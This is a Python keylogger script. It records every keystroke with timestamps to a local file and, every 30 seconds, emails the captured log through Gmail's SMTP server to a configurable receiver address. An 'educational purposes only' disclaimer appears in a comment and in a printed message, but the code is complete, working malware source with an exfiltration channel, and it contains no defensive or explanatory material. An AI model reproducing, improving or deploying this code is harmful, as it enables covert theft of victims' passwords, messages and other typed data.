from pynput import keyboard
from datetime import datetime
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import threading

# THIS CODE IS FOR EDUCATIONAL PURPOSES ONLY AND IS NOT TO BE USED FOR MALICIOUS INTENT
EMAIL_ADDRESS = "" #SENDER EMAIL
EMAIL_PASSWORD = "" # ENABLE LESS SECURE APPS FOR EMAIL AND GET AN APP PASSWORD TO ENABLE
EMAIL_RECEIVER = "" # RECIEVER EMAIL (CAN BE THE SAME AS SENDER EMAIL)
LOG_FILE = "keyfile.txt"
stop_flag = threading.Event()
email_thread = None

def clear_log_file():
    with open(LOG_FILE, 'w') as file:
        file.write("")

def send_email():
    if stop_flag.is_set():
        return
        
    try:
        with open(LOG_FILE, 'r') as file:
            log_content = file.read()

        msg = MIMEMultipart()
        msg['From'] = EMAIL_ADDRESS
        msg['To'] = EMAIL_RECEIVER
        msg['Subject'] = "Logged Keystrokes"

        msg.attach(MIMEText(log_content, 'plain'))

        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            server.send_message(msg)
        print("Email sent successfully!")
        clear_log_file()
    except Exception as e:
        print(f"Error sending email: {e}")

def keyPressed(key):
    if stop_flag.is_set():
        return False
        
    timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
    
    with open(LOG_FILE, 'a') as logKey:
        try:
            char = key.char
            if char is not None:
                logKey.write(f"{timestamp} {char}\n")
            else:
                raise ValueError("Non-character key")
        except AttributeError:
            if key == keyboard.Key.space:
                logKey.write(f"{timestamp} <SPACE>\n")
            elif key == keyboard.Key.enter:
                logKey.write(f"{timestamp} <ENTER>\n")
            elif key == keyboard.Key.backspace:
                logKey.write(f"{timestamp} <BACKSPACE>\n")
            elif key == keyboard.Key.esc:
                print("Escape key pressed, stopping program...")
                stop_flag.set()
                if email_thread:
                    email_thread.cancel()
                return False
            else:
                logKey.write(f"{timestamp} <{key.name.upper()}>\n")
        except Exception as e:
            print(f"Error getting char: {e}")

def schedule_email(interval):
    if stop_flag.is_set():
        return
        
    send_email()
    global email_thread
    email_thread = threading.Timer(interval, schedule_email, [interval])
    email_thread.start()

if __name__ == "__main__":
    print("This is used as an educational tool only. It has not and will not be used for malicious activity")

    clear_log_file()
    
    schedule_email(30)
    
    with keyboard.Listener(on_press=keyPressed) as listener:
        listener.join()